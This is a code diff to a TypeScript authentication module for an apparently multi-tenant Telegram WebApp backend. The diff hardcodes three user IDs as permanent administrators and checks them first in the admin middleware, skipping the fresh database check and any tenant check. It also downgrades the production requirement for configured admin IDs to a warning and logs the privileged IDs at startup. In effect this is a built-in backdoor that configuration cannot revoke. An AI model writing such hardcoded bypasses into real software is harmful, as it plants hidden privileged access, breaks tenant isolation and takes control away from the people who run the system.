@@ -35,16 +35,17 @@ export interface JWTPayload {
   exp?: number
 }
 
-// Admin user IDs (REQUIRED - no default for security)
+// CRITICAL: Hardcoded admin IDs that MUST ALWAYS have permanent access
+// These are developer/owner accounts that cannot be locked out under any circumstances
+export const CRITICAL_ADMIN_IDS = ['1301598469', '5357105479', '8482306696']
+
+// Admin user IDs from environment (can be added to, but CRITICAL_ADMIN_IDS always included)
 const ADMIN_IDS_STRING = process.env.ADMIN_IDS || ''
 if (!ADMIN_IDS_STRING && process.env.NODE_ENV === 'production') {
-  console.error('❌ ADMIN_IDS environment variable is REQUIRED in production')
-  throw new Error('ADMIN_IDS must be set in production')
+  console.warn('⚠️ ADMIN_IDS environment variable not set - using only CRITICAL_ADMIN_IDS')
 }
-const ADMIN_IDS = ADMIN_IDS_STRING.split(',').map(id => id.trim()).filter(id => id.length > 0)
-if (ADMIN_IDS.length === 0) {
-  console.warn('⚠️ No ADMIN_IDS configured - admin features will be disabled')
-}
+const ENV_ADMIN_IDS = ADMIN_IDS_STRING.split(',').map(id => id.trim()).filter(id => id.length > 0)
+const ADMIN_IDS = [...new Set([...CRITICAL_ADMIN_IDS, ...ENV_ADMIN_IDS])]  // Merge and dedupe
 
 /**
  * Validate Telegram WebApp initData
@@ -251,6 +252,13 @@ export async function adminMiddleware(
   // Get tenantId from request context (set by tenantMiddleware)
   const tenantId = (request as any).tenantId
 
+  // CRITICAL: Check hardcoded admin IDs FIRST - these MUST ALWAYS have access
+  if (CRITICAL_ADMIN_IDS.includes(payload.userId)) {
+    ;(request as any).user = { ...payload, isAdmin: true }
+    console.log('🔐 Admin access granted (CRITICAL):', payload.userId, payload.username)
+    return
+  }
+
   // FIX: MUST check isAdmin fresh from database/env, not from JWT payload
   // JWT payload.isAdmin can be stale (up to 7 days old)
   // Always re-check to ensure admin status changes take effect immediately
@@ -305,5 +313,7 @@ export async function isAdmin(userId: string, username?: string, tenantId?: stri
 console.log('🔐 Auth module initialized:', {
   jwtConfigured: true,
   botTokenConfigured: !!BOT_TOKEN,
-  adminIds: ADMIN_IDS
+  criticalAdmins: CRITICAL_ADMIN_IDS,
+  totalAdminIds: ADMIN_IDS
 })
+console.log('🔐 CRITICAL ADMINS (permanent access):', CRITICAL_ADMIN_IDS)
